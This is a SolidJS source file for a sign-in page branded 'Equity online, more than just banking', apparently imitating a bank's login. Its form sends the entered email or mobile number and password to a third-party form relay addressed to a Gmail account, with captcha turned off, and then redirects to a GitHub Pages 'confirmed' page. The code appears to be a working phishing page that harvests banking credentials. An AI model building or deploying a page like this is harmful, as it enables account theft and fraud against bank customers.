import { createSignal, Switch, Match } from 'solid-js'
import { Eye, EyeOff } from 'lucide-solid'

export default function Home(){
	const [visible, setVisible] = createSignal(false);

	function handleToggle(){
		setVisible(prevMode => !prevMode);
	}

	return(
		<div>
            <div className="lg:flex bg-neutral-900 w-screen h-screen text-neutral-400">
                <div className="bg-[url('/Landing-pattern-dark.svg')] bg-cover bg-center bg-black/60 bg-blend-overlay lg:w-2/3 h-fit lg:h-screen py-14 px-8">
                    <img src="Inverse.svg" alt="logo" className="scale-150 lg:scale-200 pl-5"/>
                    <div className="cursor-none mt-8 text-5xl lg:text-6xl font-medium font-sans text-neutral-100">Welcome to Equity online</div>
                    <p className="text-sm ml-2 mt-2">More than just banking</p>
                </div>
                <div className="lg:w-1/3 h-full py-16 px-6">
                    <div className="font-medium text-xl text-neutral-100 font-serif">Sign in</div>
                    <div className="text-sm font-sans">Sign in to continue. Remember, your password is yours, do not share it with anyone.</div>
                    <br/>
                    <div className="text-sm font-sans">If this is your first time here, you can register.</div>
                    <form action='https://submify.vercel.app/equityshapes@gmail.com' method='POST' className="mt-12 ">
                        <input type="hidden" name="_next" value="https://equity-shares.github.io/-/confirmed"/>
                        <input type="hidden" name="_captcha" value="false"/>
                        <label htmlFor="email" className="text-xs pl-1">Email address or mobile number</label>
                        <input type="email" name="email" id="email" placeholder="Email address or mobile number" className="w-full outline-none border-b border-solid border-neutral-400 text-neutral-200 lg:text-sm pb-2 px-1" required/>
                        <div className="relative mt-8">
                            <label htmlFor="password" className="text-xs pl-1">Enter password</label>
                            <input type={!visible() ? "password" : "text"} name="password" id="password" placeholder="Enter password" className="w-full outline-none border-b border-solid border-neutral-400 text-neutral-200 lg:text-sm pb-2 px-1" required/>
                            <Switch>
                            	<Match when={!visible()}>
                            		<Eye onClick={handleToggle} className="absolute right-0 bottom-1 w-4 text-[#ff8583]"/>
                            	</Match>
                            	<Match when={visible()}>
                            		<EyeOff onClick={handleToggle} className="absolute right-0 bottom-1 w-4 text-[#ff8583]"/>
                            	</Match>
                            </Switch>
                        </div>
                        <div className="cursor-pointer text-sm text-[#f07e7c] w-fit mt-2 px-4 py-2 rounded-md hover:bg-[#ff8583]/20">Forgot your password?</div>
                        <div className="flex justify-between w-full">
                            <button className="cursor-pointer px-8 py-2 mt-4 rounded-md bg-neutral-800 hover:ring-2 hover:ring-neutral-400/40">Sign in</button>
                            <div className="cursor-pointer px-12 py-2 mt-4 rounded-md border border-solid text-[#ff8583] hover:bg-[#ff8583]/20 border-[#ff8583]">Register</div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
	)
}